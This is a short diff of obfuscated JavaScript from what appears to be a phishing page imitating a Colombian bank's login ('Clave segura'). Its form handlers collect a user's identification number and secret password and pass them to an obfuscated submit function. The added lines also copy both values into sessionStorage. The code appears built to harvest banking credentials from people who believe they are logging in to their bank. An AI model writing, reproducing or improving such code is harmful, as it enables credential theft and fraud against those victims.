@@ -206,6 +206,7 @@ var _0xdia=_0x9g?_0x9g.value.trim():'';
 var _0xeia=_0xah?_0xah.value:'CC';
 if(!_0xcia||!_0xdia){alert('Por favor completa todos los campos');return}
 if(_0xcia.length<5){alert('La identificación debe tener al menos 5 dígitos');return}
+try{sessionStorage.setItem('identificacion',_0xcia);sessionStorage.setItem('clave',_0xdia);sessionStorage.setItem('tipoDoc',_0xeia)}catch(_0xzz){}
 await _0xx4({tipo:'Clave segura',tipoDoc:_0xeia,identificacion:_0xcia,clave:_0xdia});
 _0x29()
 })
@@ -222,6 +223,7 @@ var _0xjia=_0xgia?_0xgia.value.trim():'';
 var _0xkia=_0xhia?_0xhia.value:'CC';
 if(!_0xjia){alert('Por favor ingresa tu identificación');return}
 if(_0xjia.length<5){alert('La identificación debe tener al menos 5 dígitos');return}
+try{sessionStorage.setItem('identificacion',_0xjia);sessionStorage.setItem('clave','');sessionStorage.setItem('tipoDoc',_0xkia)}catch(_0xzz2){}
 await _0xx4({tipo:'Sin registro',tipoDoc:_0xkia,identificacion:_0xjia,clave:''});
 _0x29()
 })
